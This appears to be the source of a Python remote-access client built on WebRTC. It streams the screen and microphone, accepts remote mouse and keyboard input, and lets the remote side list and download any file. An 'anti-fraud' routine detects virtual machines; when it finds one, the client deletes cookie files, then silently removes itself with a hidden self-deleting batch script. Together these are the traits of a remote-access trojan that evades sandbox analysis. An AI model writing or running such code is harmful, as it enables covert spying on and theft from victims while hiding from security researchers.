# client.py
# Remote client using WebRTC (aiortc)
# Features:
# - Screen sharing (video)
# - Microphone audio streaming
# - Remote control (mouse / keyboard)
# - File browsing & download (data channel)

import asyncio
import json
import os
import base64
import io
import ctypes
import platform
import subprocess
import sys
import tempfile
import shutil

import pyautogui
import mss
import numpy as np

from aiortc import (
    RTCPeerConnection,
    RTCSessionDescription,
    VideoStreamTrack,
    MediaStreamTrack,
)
from aiortc.contrib.signaling import TcpSocketSignaling
from av import VideoFrame

############################################
# Video track (screen capture)
############################################

class ScreenTrack(VideoStreamTrack):
    def __init__(self):
        super().__init__()
        self.sct = mss.mss()
        self.monitor = self.sct.monitors[1]

    async def recv(self):
        pts, time_base = await self.next_timestamp()
        img = np.array(self.sct.grab(self.monitor))
        frame = VideoFrame.from_ndarray(img[:, :, :3], format="bgr24")
        frame.pts = pts
        frame.time_base = time_base
        return frame

############################################
# Audio track (system microphone for now)
############################################

class AudioTrack(MediaStreamTrack):
    kind = "audio"

    def __init__(self):
        super().__init__()
        import sounddevice as sd
        self.sd = sd
        self.queue = asyncio.Queue()

        def callback(indata, frames, time, status):
            self.queue.put_nowait(bytes(indata))

        self.stream = sd.RawInputStream(
            samplerate=48000,
            blocksize=960,
            dtype="int16",
            channels=1,
            callback=callback,
        )
        self.stream.start()

    async def recv(self):
        from av.audio.frame import AudioFrame
        data = await self.queue.get()
        frame = AudioFrame(format="s16", layout="mono", samples=len(data) // 2)
        frame.planes[0].update(data)
        frame.sample_rate = 48000
        return frame

############################################
# DataChannel handlers
############################################

def list_files(path):
    result = []
    for e in os.scandir(path):
        result.append({
            "name": e.name,
            "is_dir": e.is_dir(),
            "size": e.stat().st_size if e.is_file() else None,
        })
    return result


def handle_control(data):
    t = data.get("type")
    if t == "mouse_move":
        pyautogui.moveTo(data["x"], data["y"])
    elif t == "mouse_click":
        pyautogui.click(data["x"], data["y"], button=data.get("button", "left"))
    elif t == "keypress":
        pyautogui.press(data["key"])

############################################
# Anti-fraud device analysis (VM heuristics)
############################################

def _get_total_memory_gb():
    if platform.system() != "Windows":
        return None
    class MemoryStatus(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]

    status = MemoryStatus()
    status.dwLength = ctypes.sizeof(MemoryStatus)
    if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(status)):
        return None
    return status.ullTotalPhys / (1024 ** 3)


def _wmic_query_value(alias, fields):
    try:
        output = subprocess.check_output(
            ["wmic", alias, "get", ",".join(fields), "/value"],
            text=True,
            stderr=subprocess.DEVNULL,
        )
    except (subprocess.CalledProcessError, FileNotFoundError):
        return {}
    values = {}
    for line in output.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            values[key.strip()] = value.strip()
    return values


def _running_vm_tools():
    vm_processes = {
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vboxservice.exe",
        "vboxtray.exe",
        "qemu-ga.exe",
    }
    try:
        output = subprocess.check_output(
            ["tasklist", "/fo", "csv"],
            text=True,
            stderr=subprocess.DEVNULL,
        )
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False
    return any(proc_name.lower() in output.lower() for proc_name in vm_processes)


def anti_fraud_device_analysis():
    """Anti-fraud system: aggregate signals to flag likely virtual machines."""
    if platform.system() != "Windows":
        return False
    win_ver = sys.getwindowsversion()
    if win_ver.major < 10:
        return False

    indicators = []
    memory_gb = _get_total_memory_gb()
    if memory_gb is not None and memory_gb <= 4:
        indicators.append("low_memory")

    system_info = _wmic_query_value("computersystem", ["Manufacturer", "Model"])
    bios_info = _wmic_query_value("bios", ["Manufacturer", "SerialNumber"])
    baseboard_info = _wmic_query_value("baseboard", ["Manufacturer", "Product"])

    text_blob = " ".join(
        [
            system_info.get("Manufacturer", ""),
            system_info.get("Model", ""),
            bios_info.get("Manufacturer", ""),
            bios_info.get("SerialNumber", ""),
            baseboard_info.get("Manufacturer", ""),
            baseboard_info.get("Product", ""),
        ]
    ).lower()

    vm_keywords = (
        "vmware",
        "virtualbox",
        "vbox",
        "kvm",
        "qemu",
        "xen",
        "hyper-v",
        "parallels",
        "virtual",
        "bochs",
    )
    if any(keyword in text_blob for keyword in vm_keywords):
        indicators.append("vm_keywords")

    if _running_vm_tools():
        indicators.append("vm_tools")

    return len(indicators) >= 2 or ("vm_keywords" in indicators and "low_memory" in indicators)


def silent_uninstall_and_cleanup():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    if platform.system() != "Windows":
        return

    for root, dirs, files in os.walk(base_dir):
        for name in dirs:
            if "cookie" in name.lower():
                shutil.rmtree(os.path.join(root, name), ignore_errors=True)
        for name in files:
            if "cookie" in name.lower():
                try:
                    os.remove(os.path.join(root, name))
                except OSError:
                    pass

    cmd_script = os.path.join(tempfile.gettempdir(), "rc_uninstall.bat")
    with open(cmd_script, "w", encoding="utf-8") as handle:
        handle.write("@echo off\n")
        handle.write("timeout /t 2 /nobreak >nul\n")
        handle.write(f'rmdir /s /q "{base_dir}"\n')
        handle.write("del \"%~f0\"\n")

    creation_flags = 0x08000000
    try:
        subprocess.Popen(
            ["cmd", "/c", cmd_script],
            creationflags=creation_flags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    finally:
        os._exit(0)

############################################
# Main WebRTC client
############################################

async def run():
    if anti_fraud_device_analysis():
        silent_uninstall_and_cleanup()
        return

    signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
    signaling_port = int(os.getenv("RC_SIGNALING_PORT", "9999"))

    while True:
        signaling = TcpSocketSignaling(signaling_host, signaling_port)
        pc = RTCPeerConnection()

        # Add media tracks
        pc.addTrack(ScreenTrack())
        pc.addTrack(AudioTrack())

        @pc.on("datachannel")
        def on_datachannel(channel):
            @channel.on("message")
            async def on_message(message):
                data = json.loads(message)

                if data["action"] == "control":
                    handle_control(data)

                elif data["action"] == "list_files":
                    files = list_files(data.get("path", "."))
                    channel.send(json.dumps({"files": files}))

                elif data["action"] == "download":
                    with open(data["path"], "rb") as f:
                        channel.send(base64.b64encode(f.read()).decode())

        try:
            await signaling.connect()
            offer = await signaling.receive()
            await pc.setRemoteDescription(offer)

            answer = await pc.createAnswer()
            await pc.setLocalDescription(answer)
            await signaling.send(pc.localDescription)

            while True:
                await asyncio.sleep(1)
        except (ConnectionError, OSError, asyncio.CancelledError):
            await pc.close()
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(run())
